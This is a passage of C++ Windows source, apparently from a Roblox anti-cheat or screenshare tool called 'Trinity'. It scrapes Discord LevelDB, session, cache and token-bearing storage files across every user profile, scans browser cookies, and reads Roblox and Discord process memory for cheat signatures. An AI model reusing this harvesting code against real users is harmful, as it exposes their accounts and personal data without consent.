                    char tsbuf[32]; strftime(tsbuf, sizeof(tsbuf), "%Y-%m-%d %H:%M:%S", &tmi);
                    string tsStr = tsbuf;
                    if (idToUser[id.val].lastSeen.empty() || tsStr > idToUser[id.val].lastSeen)
                        idToUser[id.val].lastSeen = tsStr;
                }
            }
        }
        };

    // ── Helper: scan one LevelDB directory ───────────────────────────────────
    auto scanLdbDir = [&](const string& lvlPath, const string& label) {
        DWORD la = GetFileAttributesA(lvlPath.c_str());
        if (la == INVALID_FILE_ATTRIBUTES || !(la & FILE_ATTRIBUTE_DIRECTORY)) {
            Log("[DBG] Discord leveldb not found: " + lvlPath);
            return;
        }
        Log("[DBG] Discord leveldb found: " + lvlPath);

        for (const char* ext : { ".log", ".ldb" }) {
            WIN32_FIND_DATAA ffd;
            HANDLE fh = FindFirstFileA((lvlPath + "\\*" + ext).c_str(), &ffd);
            if (fh == INVALID_HANDLE_VALUE) continue;
            do {
                if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                ULONGLONG fsz = ((ULONGLONG)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow;
                if (fsz == 0 || fsz > 32ULL * 1024 * 1024) continue;
                string fpath = lvlPath + "\\" + ffd.cFileName;
                HANDLE hf = CreateFileA(fpath.c_str(), GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                if (hf == INVALID_HANDLE_VALUE) continue;
                string raw((size_t)fsz, '\0');
                DWORD rd = 0; ReadFile(hf, &raw[0], (DWORD)fsz, &rd, nullptr); CloseHandle(hf);
                raw.resize(rd);

                // Pass 1: proper LevelDB parse -> clean key+value strings
                vector<string> parsed;
                if (string(ext) == ".log") ParseLevelDbLog(raw, parsed);
                else                        ParseLevelDbSst(raw, parsed);
                size_t before = idToUser.size();
                for (auto& s : parsed) processString(s, label);

                // Pass 2: raw fallback (null->space)
                string cooked = raw;
                for (char& c : cooked)
                    if ((unsigned char)c < 0x20 && c != '\n' && c != '\r' && c != '\t') c = ' ';
                processString(cooked, label + "-raw");

                if (parsed.size() > 0 || idToUser.size() > before)
                    Log("[DBG] Discord LDB " + fpath + ": parsed=" +
                        std::to_string(parsed.size()) + " strings, +" +
                        std::to_string(idToUser.size() - before) + " new accounts");
            } while (FindNextFileA(fh, &ffd));
            FindClose(fh);
        }
        };

    WIN32_FIND_DATAA ufd;
    HANDLE uh = FindFirstFileA("C:\\Users\\*", &ufd);
    if (uh == INVALID_HANDLE_VALUE) {
        accounts.push_back("Discord: not installed or no account data found");
        return accounts;
    }
    do {
        if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        string uname = ufd.cFileName;
        if (uname == "." || uname == ".." || uname == "Public" ||
            uname == "Default" || uname == "Default User") continue;
        string roaming = "C:\\Users\\" + uname + "\\AppData\\Roaming";

        for (auto& v : variants) {
            string varBase = roaming + "\\" + v;

            // ── 1. renderer_js.log — collect timestamps into rendererTs
            // Scanned AFTER LDB (below) so we only update already-known accounts.
            // Reading happens here just to load the file; timestamp merging runs
            // after scanLdbDir so idToUser is populated when we need it.
            string logsDir = varBase + "\\logs";
            for (const string& logName : { string("renderer_js.log"), string("renderer_js.old.log") }) {
                string logPath = logsDir + "\\" + logName;
                HANDLE hf = CreateFileA(logPath.c_str(), GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                if (hf == INVALID_HANDLE_VALUE) continue;
                LARGE_INTEGER lfsz = {}; GetFileSizeEx(hf, &lfsz);
                if (lfsz.QuadPart <= 0 || lfsz.QuadPart > 64LL * 1024 * 1024)
                {
                    CloseHandle(hf); continue;
                }
                string rjContent((size_t)lfsz.QuadPart, '\0');
                DWORD rd = 0; ReadFile(hf, &rjContent[0], (DWORD)lfsz.QuadPart, &rd, nullptr);
                CloseHandle(hf); rjContent.resize(rd);
                Log("[DBG] Discord renderer log: " + logPath + " (" + std::to_string(rd) + "b)");

                // Scan every line for any snowflake + timestamp.
                // We do NOT add new accounts here — only update lastSeen for
                // IDs already in idToUser (populated by LDB scan below).
                // We defer the merge to after scanLdbDir.
                size_t lineStart = 0;
                while (lineStart < rjContent.size()) {
                    size_t lineEnd = rjContent.find('\n', lineStart);
                    if (lineEnd == string::npos) lineEnd = rjContent.size();
                    if (lineEnd > lineStart) {
                        string line(rjContent.begin() + lineStart, rjContent.begin() + lineEnd);
                        string ts;
                        std::smatch tm;
                        std::regex tsRx("\\[(\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2})");
                        if (std::regex_search(line, tm, tsRx)) ts = tm[1].str();
                        if (!ts.empty()) {
                            for (auto it = std::sregex_iterator(line.begin(), line.end(), snowflakeRx);
                                it != std::sregex_iterator(); ++it) {
                                string uid = (*it)[1].str();
                                // Accumulate best (latest) timestamp per ID
                                auto existing = rendererTs.find(uid);
                                if (existing == rendererTs.end() || ts > existing->second)
                                    rendererTs[uid] = ts;
                            }
                        }
                    }
                    lineStart = lineEnd + 1;
                }
                Log("[DBG]   renderer_js scanned for timestamps");
            }

            // ── 2. Local Storage\leveldb (current install) ────────────────────
            scanLdbDir(varBase + "\\Local Storage\\leveldb", v + "@" + uname);

            // ── Merge renderer_js timestamps into known accounts ──────────────
            // Now that idToUser is populated, apply any timestamps collected from
            // renderer_js.log for matching IDs. Never adds new accounts.
            for (auto& kv : idToUser) {
                auto it = rendererTs.find(kv.first);
                if (it != rendererTs.end()) {
                    if (kv.second.lastSeen.empty() || it->second > kv.second.lastSeen)
                        kv.second.lastSeen = it->second;
                }
            }

            // ── 3. Old app-X.X.XXXX version dirs (historical) ────────────────
            // Discord keeps every previous version under AppData\Local\discord\
            // app-X.X.XXXX\. Each has its own Local Storage\leveldb and logs
            // directory that never gets compacted again after Discord updates.
            // This is the single richest source for accounts that have since
            // been removed from the current install's LevelDB.
            {
                string localDiscord = "C:\\Users\\" + uname + "\\AppData\\Local\\" + v;
                WIN32_FIND_DATAA afd;
                HANDLE ah = FindFirstFileA((localDiscord + "\\app-*").c_str(), &afd);
                if (ah != INVALID_HANDLE_VALUE) {
                    do {
                        if (!(afd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                        string appDir = localDiscord + "\\" + afd.cFileName;
                        string appLabel = v + "-" + afd.cFileName + "@" + uname;

                        // Old version LevelDB
                        scanLdbDir(appDir + "\\Local Storage\\leveldb", appLabel + "-ldb");

                        // Old version renderer logs — same line-by-line scan
                        string oldLogsDir = appDir + "\\logs";
                        for (const string& logName : { string("renderer_js.log"), string("renderer_js.old.log") }) {
                            string logPath = oldLogsDir + "\\" + logName;
                            HANDLE hf = CreateFileA(logPath.c_str(), GENERIC_READ,
                                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                            if (hf == INVALID_HANDLE_VALUE) continue;
                            LARGE_INTEGER lfsz2 = {}; GetFileSizeEx(hf, &lfsz2);
                            if (lfsz2.QuadPart <= 0 || lfsz2.QuadPart > 64LL * 1024 * 1024)
                            {
                                CloseHandle(hf); continue;
                            }
                            string content2((size_t)lfsz2.QuadPart, '\0');
                            DWORD rd2 = 0; ReadFile(hf, &content2[0], (DWORD)lfsz2.QuadPart, &rd2, nullptr);
                            CloseHandle(hf); content2.resize(rd2);
                            Log("[DBG] Discord old-ver renderer log: " + logPath + " (" + std::to_string(rd2) + "b)");
                            size_t ls2 = 0, sh2 = 0;
                            while (ls2 < content2.size()) {
                                size_t le2 = content2.find('\n', ls2);
                                if (le2 == string::npos) le2 = content2.size();
                                string line2 = content2.substr(ls2, le2 - ls2);
                                ls2 = le2 + 1;
                                string ll2 = Lower(line2);
                                bool sw2 =
                                    ll2.find("multiaccount") != string::npos ||
                                    ll2.find("switching") != string::npos ||
                                    ll2.find("login_success") != string::npos ||
                                    ll2.find("logged in") != string::npos ||
                                    ll2.find("account switch") != string::npos ||
                                    ll2.find("switchaccount") != string::npos ||
                                    ll2.find("[auth]") != string::npos ||
                                    ll2.find("token valid") != string::npos ||
                                    ll2.find("user_settings") != string::npos ||
                                    ll2.find("localid") != string::npos ||
                                    ll2.find("current_user") != string::npos ||
                                    ll2.find("currentuser") != string::npos;
                                if (!sw2) continue;
                                string ts2;
                                std::smatch tm2;
                                std::regex tsRx2("\\[(\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2})");
                                if (std::regex_search(line2, tm2, tsRx2)) ts2 = tm2[1].str();
                                for (auto it = std::sregex_iterator(line2.begin(), line2.end(), snowflakeRx);
                                    it != std::sregex_iterator(); ++it) {
                                    string uid2 = (*it)[1].str();
                                    if (idToUser.find(uid2) == idToUser.end()) idToUser[uid2] = {};
                                    if (!ts2.empty() && (idToUser[uid2].lastSeen.empty() || ts2 > idToUser[uid2].lastSeen))
                                        idToUser[uid2].lastSeen = ts2;
                                    Log("[DBG]   old-ver switch -> " + uid2 + (ts2.empty() ? "" : " at " + ts2));
                                    sh2++;
                                }
                            }
                            if (sh2) Log("[DBG]   old-ver renderer hits: " + std::to_string(sh2));
                        }
                    } while (FindNextFileA(ah, &afd));
                    FindClose(ah);
                }
            }

            // ── 4. Cache\Cache_Data (HTTP response cache) ─────────────────────
            // Discord's Chromium cache stores raw HTTP responses from the Discord
            // API. User objects returned by /api/v9/users/@me and similar
            // endpoints are cached here verbatim, including "id", "username",
            // "global_name" fields. Files are binary with a 24-byte header;
            // we just run the raw fallback scan since there's no structured
            // parse needed — JSON user blobs are contiguous in the cache data.
            // Cap per-file at 4 MB to avoid hitting huge media cache entries.
            {
                string cacheDir = varBase + "\\Cache\\Cache_Data";
                DWORD cd = GetFileAttributesA(cacheDir.c_str());
                if (cd != INVALID_FILE_ATTRIBUTES && (cd & FILE_ATTRIBUTE_DIRECTORY)) {
                    Log("[DBG] Discord cache found: " + cacheDir);
                    WIN32_FIND_DATAA cfd;
                    HANDLE ch = FindFirstFileA((cacheDir + "\\*").c_str(), &cfd);
                    if (ch != INVALID_HANDLE_VALUE) {
                        do {
                            if (cfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                            ULONGLONG cfsz = ((ULONGLONG)cfd.nFileSizeHigh << 32) | cfd.nFileSizeLow;
                            if (cfsz == 0 || cfsz > 4ULL * 1024 * 1024) continue;
                            string cfpath = cacheDir + "\\" + cfd.cFileName;
                            HANDLE hf = CreateFileA(cfpath.c_str(), GENERIC_READ,
                                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                            if (hf == INVALID_HANDLE_VALUE) continue;
                            string craw((size_t)cfsz, '\0');
                            DWORD crd = 0; ReadFile(hf, &craw[0], (DWORD)cfsz, &crd, nullptr); CloseHandle(hf);
                            craw.resize(crd);
                            // Quick pre-filter: skip files with no '"id"' string at all
                            if (craw.find("\"id\"") == string::npos) continue;
                            for (char& c : craw)
                                if ((unsigned char)c < 0x20 && c != '\n' && c != '\r' && c != '\t') c = ' ';
                            processString(craw, v + "-cache@" + uname);
                        } while (FindNextFileA(ch, &cfd));
                        FindClose(ch);
                    }
                }
            }

            // IndexedDB intentionally skipped.
            // It contains guild member lists, DM participants, and channel data —
            // thousands of snowflakes that are not locally authenticated accounts.

            // ── 6. Session Storage\leveldb ────────────────────────────────────
            // Chromium also maintains Session Storage as a separate LevelDB.
            // Discord writes token and user ID into session storage on login;
            // this persists until the session is explicitly cleared.
            scanLdbDir(varBase + "\\Session Storage", v + "-session@" + uname);
        }

        // ── 7. Roaming discord\storage (legacy / Electron older builds) ───────
        // Older Discord builds (pre-2020) stored account data in a flat
        // storage.json under AppData\Roaming\discord\storage\.
        // Pattern: {"token":"<tok>","...":"..."}
        for (auto& v : variants) {
            string storagePath = "C:\\Users\\" + uname + "\\AppData\\Roaming\\" + v + "\\storage\\storage.json";
            HANDLE hf = CreateFileA(storagePath.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hf == INVALID_HANDLE_VALUE) continue;
            LARGE_INTEGER sfsz = {}; GetFileSizeEx(hf, &sfsz);
            if (sfsz.QuadPart > 0 && sfsz.QuadPart <= 2 * 1024 * 1024) {
                string sdata((size_t)sfsz.QuadPart, '\0');
                DWORD srd = 0; ReadFile(hf, &sdata[0], (DWORD)sfsz.QuadPart, &srd, nullptr);
                sdata.resize(srd);
                Log("[DBG] Discord legacy storage.json: " + storagePath);
                processString(sdata, v + "-storage@" + uname);
            }
            CloseHandle(hf);
        }
    } while (FindNextFileA(uh, &ufd));
    FindClose(uh);

    // ── lastSwitched timestamp pass ───────────────────────────────────────────
    // processString works on individual parsed/cooked string chunks, so "id"
    // and "lastSwitched" in the same LDB file often end up in different chunks
    // and never appear together in one processString call.
    // Fix: re-scan every Local Storage LDB file as a single raw blob, search
    // for each known account ID and grab the nearest "lastSwitched" ms value
    // anywhere in the file.  No chunk boundaries, no parsing required.
    if (!idToUser.empty()) {
        WIN32_FIND_DATAA lsufd;
        HANDLE lsuh = FindFirstFileA("C:\\Users\\*", &lsufd);
        if (lsuh != INVALID_HANDLE_VALUE) {
            do {
                if (!(lsufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                string lsuname = lsufd.cFileName;
                if (lsuname == "." || lsuname == ".." || lsuname == "Public" ||
                    lsuname == "Default" || lsuname == "Default User") continue;
                for (auto& lsv : variants) {
                    string lsDir = "C:\\Users\\" + lsuname + "\\AppData\\Roaming\\" +
                        lsv + "\\Local Storage\\leveldb";
                    for (const char* ext : { ".ldb", ".log" }) {
                        WIN32_FIND_DATAA lsffd;
                        HANDLE lsfh = FindFirstFileA((lsDir + "\\*" + ext).c_str(), &lsffd);
                        if (lsfh == INVALID_HANDLE_VALUE) continue;
                        do {
                            if (lsffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                            ULONGLONG lsfsz = ((ULONGLONG)lsffd.nFileSizeHigh << 32) | lsffd.nFileSizeLow;
                            if (lsfsz == 0 || lsfsz > 32ULL * 1024 * 1024) continue;
                            string lsfp = lsDir + "\\" + lsffd.cFileName;
                            HANDLE lshf = CreateFileA(lsfp.c_str(), GENERIC_READ,
                                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                            if (lshf == INVALID_HANDLE_VALUE) continue;
                            string lsraw((size_t)lsfsz, '\0');
                            DWORD lsrd = 0;
                            ReadFile(lshf, &lsraw[0], (DWORD)lsfsz, &lsrd, nullptr);
                            CloseHandle(lshf);
                            lsraw.resize(lsrd);
                            // Replace control chars so regex works cleanly
                            for (char& c : lsraw)
                                if ((unsigned char)c < 0x20 && c != '\n' && c != '\r' && c != '\t') c = ' ';

                            // Find every "lastSwitched":<ms> in this file
                            std::vector<std::pair<size_t, long long>> lsPositions;
                            {
                                size_t sp = 0;
                                while ((sp = lsraw.find("\"lastSwitched\"", sp)) != string::npos) {
                                    // skip to the colon then digits
                                    size_t cp = lsraw.find_first_of("0123456789", sp + 14);
                                    if (cp == string::npos || cp - sp > 30) { sp++; continue; }
                                    size_t ep = lsraw.find_first_not_of("0123456789", cp);
                                    string ms_str = lsraw.substr(cp, ep - cp);
                                    if (ms_str.size() >= 12 && ms_str.size() <= 14) {
                                        try { lsPositions.push_back({ cp, std::stoll(ms_str) }); }
                                        catch (...) {}
                                    }
                                    sp++;
                                }
                            }
                            if (lsPositions.empty()) continue;

                            // For each known account ID, find nearest lastSwitched in file
                            for (auto& kv2 : idToUser) {
                                const string& uid2 = kv2.first;
                                string idPat = "\"" + uid2 + "\"";
                                size_t ip = 0;
                                while ((ip = lsraw.find(idPat, ip)) != string::npos) {
                                    size_t bestD = SIZE_MAX; long long bestMs2 = 0;
                                    for (auto& lsp : lsPositions) {
                                        size_t d = (lsp.first > ip) ? lsp.first - ip : ip - lsp.first;
                                        if (d < bestD) { bestD = d; bestMs2 = lsp.second; }
                                    }
                                    if (bestD <= 8000 && bestMs2 > 0) {
                                        time_t t2 = (time_t)(bestMs2 / 1000);
                                        struct tm tmi2; gmtime_s(&tmi2, &t2);
                                        char tsbuf2[32]; strftime(tsbuf2, sizeof(tsbuf2), "%Y-%m-%d %H:%M:%S", &tmi2);
                                        string tsStr2 = tsbuf2;
                                        if (kv2.second.lastSeen.empty() || tsStr2 > kv2.second.lastSeen)
                                            kv2.second.lastSeen = tsStr2;
                                    }
                                    ip++;
                                }
                            }
                        } while (FindNextFileA(lsfh, &lsffd));
                        FindClose(lsfh);
                    }
                }
            } while (FindNextFileA(lsuh, &lsufd));
            FindClose(lsuh);
        }
    }

    // ── Format output ─────────────────────────────────────────────────────────
    for (auto& kv : idToUser) {
        const string& uid = kv.first;
        const auto& u = kv.second;
        string entry;
        if (!u.username.empty() && !u.gname.empty())
            entry = u.username + " (@" + u.gname + ") ID: " + uid;
        else if (!u.username.empty())
            entry = u.username + " ID: " + uid;
        else
            entry = "Discord ID: " + uid;
        if (!u.lastSeen.empty())
            entry += "  (last switched: " + u.lastSeen + ")";
        accounts.push_back(entry);
    }

    if (accounts.empty())
        accounts.push_back("Discord: not installed or no account data found");
    return accounts;
}


static vector<string> TrinityGetRobloxProfileUrls() {
    vector<string> urls;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Roblox\\RobloxStudio",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return urls;
    char name[16384]; DWORD nameLen; BYTE data[65536]; DWORD dataLen, type; DWORD idx = 0;
    while (true) {
        nameLen = sizeof(name); dataLen = sizeof(data);
        LONG r = RegEnumValueA(hKey, idx++, name, &nameLen, nullptr, &type, data, &dataLen);
        if (r != ERROR_SUCCESS) break;
        if (type == REG_SZ) {
            string val((char*)data);
            std::regex rx("https://www\\.roblox\\.com/games/(\\d+)");
            std::smatch m;
            if (std::regex_search(val, m, rx))
                urls.push_back("PlaceID: https://www.roblox.com/games/" + m[1].str());
        }
    }
    RegCloseKey(hKey);
    return urls;
}

static SystemInfo TrinityGetSystemInfo() {
    SystemInfo info;
    char buf[256] = {};
    DWORD sz = sizeof(buf);
    GetComputerNameA(buf, &sz); info.hostname = buf;
    sz = sizeof(buf); GetUserNameA(buf, &sz); info.username = buf;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char product[256] = {}; sz = sizeof(product);
        RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)product, &sz);
        char buildStr[32] = {}; sz = sizeof(buildStr);
        RegQueryValueExA(hKey, "CurrentBuildNumber", nullptr, nullptr, (LPBYTE)buildStr, &sz);
        DWORD ubr = 0; sz = sizeof(ubr);
        RegQueryValueExA(hKey, "UBR", nullptr, nullptr, (LPBYTE)&ubr, &sz);
        RegCloseKey(hKey);
        info.osVersion = string(product) + " (Build " + buildStr +
            (ubr ? "." + std::to_string(ubr) : "") + ")";
    }
    info.windowsInstallDate = TrinityGetWindowsInstallDate();
    info.robloxAccounts = TrinityGetRobloxIds();
    info.discordAccounts = TrinityGetDiscordAccounts();
    info.robloxProfileUrls = TrinityGetRobloxProfileUrls();
    // Cookie scan for Roblox session notes (Discord cookie results are already
    // folded into discordAccounts inside TrinityGetDiscordAccounts)
    {
        vector<string> discordIgnored; // already collected above
        ScanAllBrowserCookies(discordIgnored, info.robloxCookieNotes);
    }
    return info;
}

// =========================================================================
//  Trinity: Roblox process helpers
// =========================================================================
static vector<TrinityProcInfo> FindRobloxProcesses() {
    vector<TrinityProcInfo> found;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return found;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            string n = Lower(WtoS(pe.szExeFile));
            if (n.find("robloxplayerbeta") != string::npos)
                found.push_back({ pe.th32ProcessID, WtoS(pe.szExeFile) });
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// =========================================================================
//  Trinity: Memory scans
// =========================================================================
static string ScanRobloxMemory() {
    auto procs = FindRobloxProcesses();
    if (procs.empty()) return "Roblox Memory: No running Roblox process found";

    vector<string> lines;
    for (auto& pi : procs) {
        HANDLE h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pi.pid);
        if (!h) continue;
        MEMORY_BASIC_INFORMATION mbi = {};
        LPVOID addr = nullptr;
        while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT &&
                (mbi.Protect == PAGE_EXECUTE || mbi.Protect == PAGE_EXECUTE_READ ||
                    mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_WRITECOPY)) {
                SIZE_T readSz = std::min(mbi.RegionSize, (SIZE_T)0x100000);
                vector<BYTE> buf(readSz);
                SIZE_T bytesRead = 0;
                if (ReadProcessMemory(h, mbi.BaseAddress, buf.data(), readSz, &bytesRead) && bytesRead > 0) {
                    // Lua bytecode signatures
                    for (const auto& sig : LUA_BYTECODE_SIGS) {
                        if (std::search(buf.begin(), buf.begin() + bytesRead,
                            sig.begin(), sig.end()) != buf.begin() + bytesRead) {
                            std::ostringstream oss;
                            oss << "Lua bytecode signature found at 0x" << std::hex
                                << (uintptr_t)mbi.BaseAddress << " (PID " << pi.pid << ")";
                            lines.push_back(oss.str()); break;
                        }
                    }
                    // Executor API strings
                    string chunk(buf.begin(), buf.begin() + bytesRead);
                    string chunkLow = Lower(chunk);
                    for (const auto& api : EXECUTOR_API_STRINGS) {
                        if (chunkLow.find(api) != string::npos)
                            lines.push_back("Executor API in Roblox memory: " + api +
                                " (PID " + std::to_string(pi.pid) + ")");
                    }
                    // Suspicious URLs — Fix 6: stop at control chars (< 0x20) in addition
                    // to printable delimiters, matching Python's regex \x00-\x1f class.
                    for (const auto& pfx : SUSPICIOUS_URL_PREFIXES) {
                        size_t pos = 0;
                        while ((pos = chunk.find(pfx, pos)) != string::npos) {
                            size_t end = chunk.size();
                            for (size_t k = pos; k < chunk.size(); ++k) {
                                unsigned char ch = (unsigned char)chunk[k];
                                if (ch < 0x20 || ch == '"' || ch == '\'' ||
                                    ch == '<' || ch == '>' || ch == ')' || ch == ']') {
                                    end = k; break;
                                }
                            }
                            string url = chunk.substr(pos, end - pos);
                            lines.push_back("Suspicious URL in Roblox memory: " + url);
                            pos += pfx.size();
                        }
                    }
                }
            }
            // Fix 2: MEM_MAPPED / MZ check is INDEPENDENT of the executable-protect
            // filter — mirrors Python's separate `if mtype == 0x20000` branch so
            // manually mapped PEs that aren't marked executable are still detected.
            if (mbi.State == MEM_COMMIT && mbi.Type == MEM_MAPPED) {
                BYTE header[2] = {};
                SIZE_T bytesRead2 = 0;
                if (ReadProcessMemory(h, mbi.BaseAddress, header, sizeof(header), &bytesRead2)
                    && bytesRead2 == 2 && header[0] == 'M' && header[1] == 'Z') {
                    std::ostringstream oss;
                    oss << "Manually mapped PE in Roblox (PID " << pi.pid
                        << ") at 0x" << std::hex << (uintptr_t)mbi.BaseAddress;
                    lines.push_back(oss.str());
                }
            }
            addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
        }
        CloseHandle(h);
    }
    if (lines.empty()) return "Roblox Memory: No cheat signatures found";
    string r;
    for (auto& l : lines) r += l + "\n";
    return r;
}

static string CheckRobloxInjectedModules() {
    auto procs = FindRobloxProcesses();
    if (procs.empty()) return "Injected Modules: No running Roblox process found";

    vector<string> injected;
    for (auto& proc : procs) {
        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, proc.pid);
        if (!h) continue;
        // Fix 8: Use VirtualQueryEx + GetMappedFileNameA instead of EnumProcessModules.
        // EnumProcessModules only returns DLLs in the loader's module list — manually
        // injected DLLs that unlink themselves are invisible to it.
        // VirtualQueryEx walks ALL mapped regions so unlinked/manually-mapped DLLs
        // are found, matching Python's psutil.memory_maps() behaviour.
        std::set<string> seenPaths; // deduplicate multi-region files
        MEMORY_BASIC_INFORMATION mbi = {};
        LPVOID addr = nullptr;
        while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT &&
                (mbi.Type == MEM_IMAGE || mbi.Type == MEM_MAPPED)) {
                char modPath[MAX_PATH] = {};
                if (GetMappedFileNameA(h, mbi.BaseAddress, modPath, MAX_PATH) > 0) {
                    string mp = Lower(modPath);
                    if (seenPaths.insert(mp).second) { // process each file only once
                        if (mp.find("robloxplayerexecutor") != string::npos) {
                            HANDLE hf = CreateFileA(modPath, GENERIC_READ,
                                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                            string ts = "unknown";
                            if (hf != INVALID_HANDLE_VALUE) {
                                FILETIME ft; GetFileTime(hf, nullptr, nullptr, &ft); CloseHandle(hf);
                                ULONGLONG v = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
                                ts = TrinityFiletimeToString(v);
                            }
                            injected.push_back("Found: RobloxPlayerExecutor.dll in prefetch | Modified: " + ts);
                        }
                        if (mp.size() > 4 && mp.substr(mp.size() - 4) == ".dll" &&
                            mp.find("roblox") == string::npos &&
                            mp.find("windows") == string::npos &&
                            mp.find("system32") == string::npos)
                            injected.push_back("Unsigned DLL in Roblox (PID " +
                                std::to_string(proc.pid) + "): " + modPath);
                        if (mp.find("\\temp\\") != string::npos ||
                            mp.find("\\downloads\\") != string::npos)
                            injected.push_back("Suspicious path DLL in Roblox (PID " +
                                std::to_string(proc.pid) + "): " + modPath);
                    }
                }
            }
            addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
        }
        CloseHandle(h);
    }
    if (injected.empty()) return "Injected Modules: No suspicious DLLs found in Roblox";
    string r = "Injected Modules:\n";
    for (auto& s : injected) r += s + "\n";
    return r;
}

static string ScanDiscordMemory() {
    std::set<string> exes = { "discord.exe", "discordcanary.exe", "discordptb.exe" };
    vector<string> found;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "Discord Memory: Could not snapshot processes";
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (exes.count(Lower(WtoS(pe.szExeFile)))) {
                HANDLE h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (!h) continue;
                MEMORY_BASIC_INFORMATION mbi = {};
                LPVOID addr = nullptr;
                while (VirtualQueryEx(h, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                    if (mbi.State == MEM_COMMIT && mbi.RegionSize < 0x500000) {
                        vector<BYTE> buf(mbi.RegionSize);
                        SIZE_T br = 0;
                        if (ReadProcessMemory(h, mbi.BaseAddress, buf.data(), mbi.RegionSize, &br)) {
                            string chunk(buf.begin(), buf.begin() + br);
                            for (const auto& pfx : SUSPICIOUS_URL_PREFIXES) {
                                size_t pos = 0;
                                while ((pos = chunk.find(pfx, pos)) != string::npos) {
                                    // Fix 6: stop at null bytes and all control chars (matches Python regex \x00-\x1f)
                                    size_t end = chunk.size();
                                    for (size_t k = pos; k < chunk.size(); ++k) {
                                        unsigned char ch = (unsigned char)chunk[k];
                                        if (ch < 0x20 || ch == '"' || ch == '\'' ||
                                            ch == '<' || ch == '>') {
                                            end = k; break;
                                        }
                                    }
                                    string url = chunk.substr(pos, end - pos);
                                    if (!IsMediaUrl(url) &&
                                        std::find(found.begin(), found.end(), url) == found.end())
                                        found.push_back(url);
                                    pos += pfx.size();
                                }
                            }
                        }
                    }
                    addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
                }
                CloseHandle(h);
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (found.empty()) return "Discord Memory: No suspicious URLs found";
    string r = "Suspicious URLs in Discord memory:\n";
    for (auto& u : found) r += u + "\n";
    return r;
}

// =========================================================================
//  Trinity: Roblox logs and FFlags
// =========================================================================
static vector<string> TrinityFetchRobloxLogs() {
    vector<string> results;
    char localApp[MAX_PATH] = {};
    GetEnvironmentVariableA("LOCALAPPDATA", localApp, MAX_PATH);
    string logdir = string(localApp) + "\\roblox\\logs";
    DWORD a = GetFileAttributesA(logdir.c_str());
    if (a == INVALID_FILE_ATTRIBUTES || !(a & FILE_ATTRIBUTE_DIRECTORY)) return results;

    vector<std::pair<ULONGLONG, string>> files;
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA((logdir + "\\*_last.log").c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            string fp = logdir + "\\" + fd.cFileName;
            HANDLE hf = CreateFileA(fp.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
